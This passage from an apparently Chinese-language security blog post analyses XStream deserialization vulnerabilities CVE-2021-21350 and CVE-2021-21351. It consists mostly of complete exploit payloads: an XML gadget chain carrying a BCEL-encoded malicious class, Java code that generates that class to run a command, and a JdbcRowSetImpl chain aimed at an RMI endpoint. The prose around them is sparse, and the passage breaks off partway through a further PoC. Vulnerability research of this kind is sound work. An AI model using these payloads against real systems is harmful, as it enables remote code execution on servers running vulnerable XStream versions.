class="keyword">void</span> <span class="title">nextStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (in != <span class="keyword">null</span>) &#123;</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (e.hasMoreElements()) &#123;</span><br><span class="line">        in = (InputStream) e.nextElement();</span><br><span class="line">        <span class="keyword">if</span> (in == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> in = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会考虑e属性的值，在判断的时候其实会来到<code>hasNext()</code>方法，这里会根据<code>processorCL</code>的内容进行对象的实例化</p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809151301208.png" alt="image-20210809151301208"></p><p>这里对应PoC中的写法就是：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809151626276.png" alt="image-20210809151626276" style="zoom:50%;"><h1 id="CVE-2021-21350"><a href="#CVE-2021-21350" class="headerlink" title="CVE_2021_21350"></a>CVE_2021_21350</h1><p>XStream：1.4.15</p><p>jdk: 8u231</p><h2 id="漏洞成因-7"><a href="#漏洞成因-7" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>和CVE-2021-21347类似，这是把远程jar改为了BCEL方式加载</p><h2 id="PoC-7"><a href="#PoC-7" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">'javafx.collections.ObservableList$1'</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">'java.io.SequenceInputStream'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">'javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">'com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">'java.util.AbstractList$Itr'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">'java.util.Arrays$ArrayList'</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">'string-array'</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$ddN$c20$Y$3d$85$c9$60$O$e5G$fcW$f0J0Qn$bc$c3$Y$T$83$89$c9$oF$M$5e$97$d9$60$c9X$c9$d6$R$5e$cb$h5$5e$f8$A$3e$94$f1$x$g$q$b1MwrN$cf$f9$be$b6$fb$fcz$ff$Ap$8a$aa$83$MJ$O$caX$cb$a2bp$dd$c6$86$8dM$86$cc$99$M$a5$3egH$d7$h$3d$G$ebR$3d$K$86UO$86$e2$s$Z$f5Et$cf$fb$B$v$rO$f9$3c$e8$f1H$g$fe$xZ$faI$c6T$c3kOd$d0bp$daS_$8c$b5Talc$8bxW$r$91$_$ae$a41$e7$8c$e9d$c8$t$dc$85$8d$ac$8dm$X$3b$d8$a5$d2j$y$c2$da1$afQ$D$3f$J$b8V$91$8b$3d$ecS$7d$Ta$u$98P3$e0$e1$a0$d9$e9$P$85$af$Z$ca3I$aa$e6ug$de$93$a1$f8g$bcKB$zG$d4$d6$Z$I$3d$t$95z$c3$fb$e7$a1$83$5bb$w$7c$86$c3$fa$c2nWG2$i$b4$W$D$b7$91$f2E$i$b7p$80$rzQ3$YM$ba$NR$c8$R$bb$md$84$xG$af$60oH$95$d2$_$b0$k$9eII$c11$3a$d2$f4$cd$c2$ow$9e$94eb$eeO$820$3fC$d0$$$fd$BZ$85Y$ae$f8$N$93$85$cf$5c$c7$B$A$A<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.bcel.internal.util.ClassLoader'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">parent</span> <span class="attr">class</span>=<span class="string">'sun.misc.Launcher$ExtClassLoader'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">'hashtable'</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span> <span class="attr">defined-in</span>=<span class="string">'java.lang.ClassLoader'</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.bcel.internal.util.ClassLoader'</span> <span class="attr">reference</span>=<span class="string">'../..'</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">'../..'</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">packages</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">nativeLibraries</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">assertionLock</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.bcel.internal.util.ClassLoader'</span> <span class="attr">reference</span>=<span class="string">'..'</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultAssertionStatus</span>&gt;</span>false<span class="tag">&lt;/<span class="name">defaultAssertionStatus</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>sun.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">repository</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.bcel.internal.util.SyntheticRepository'</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">paths</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class__path</span>&gt;</span>.<span class="tag">&lt;/<span class="name">class__path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">__path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">__loadedClasses</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">deferTo</span> <span class="attr">class</span>=<span class="string">'sun.misc.Launcher$ExtClassLoader'</span> <span class="attr">reference</span>=<span class="string">'../parent'</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">'java.io.ByteArrayInputStream'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">'../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>复现：</p><p>按照三梦师傅的Payload生成代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> threedr3am</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open -a calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        InputStream inputStream = Evil.class.getResourceAsStream("Evil.class");</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[inputStream.available()];</span><br><span class="line">        inputStream.read(bytes);</span><br><span class="line">        String code = Utility.encode(bytes, <span class="keyword">true</span>);</span><br><span class="line">        String bcel = <span class="string">"$$BCEL$$"</span> + code;</span><br><span class="line">        System.out.println(bcel);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试：</p><p>加载恶意Class的Classloader不再使用URLClassloader去远程加载，而是采用了com.sun.org.apache.bcel.internal.util.ClassLoader，使用了BCEL的方式来进行恶意代码执行。</p><h1 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE_2021_21351"></a>CVE_2021_21351</h1><h2 id="漏洞成因-8"><a href="#漏洞成因-8" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>JdbcRowSetImpl攻击</p><h2 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h2><h3 id="PoC-8"><a href="#PoC-8" class="headerlink" title="PoC"></a>PoC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xpath.internal.objects.XRTreeFrag'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtm</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__size</span>&gt;</span>-10086<span class="tag">&lt;/<span class="name">m__size</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">__overrideDefaultParser</span>&gt;</span>false<span class="tag">&lt;/<span class="name">__overrideDefaultParser</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__incremental</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__incremental</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__source__location</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__source__location</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__defaultHandler</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__shouldStripWS</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__shouldStripWS</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__indexing</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__indexing</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__incrementalSAXSource</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fPullParserConfig</span> <span class="attr">class</span>=<span class="string">'com.sun.rowset.JdbcRowSetImpl'</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">listeners</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fPullParserConfig</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">name</span>&gt;</span>setAutoCommit<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">class</span>&gt;</span>boolean<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigParse</span> <span class="attr">reference</span>=<span class="string">'../fConfigSetInput'</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fParseInProgress</span>&gt;</span>false<span class="tag">&lt;/<span class="name">fParseInProgress</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__incrementalSAXSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__walker</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">nextIsRaw</span>&gt;</span>false<span class="tag">&lt;/<span class="name">nextIsRaw</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__walker</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__endDocumentOccured</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__endDocumentOccured</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__idAttributes</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__textPendingStart</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">m__textPendingStart</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__useSourceLocationProperty</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__useSourceLocationProperty</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__pastFirstElement</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__pastFirstElement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">m__dtm</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtmIdentity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmIdentity</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__dtmRoot</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmRoot</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__allowRelease</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__allowRelease</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xpath.internal.objects.XString'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">'string'</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="低版本"><a href="#低版本" class="headerlink" title="低版本"></a>低版本</h2><h3 id="PoC-9"><a href="#PoC-9" class="headerlink" title="PoC"></a>PoC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 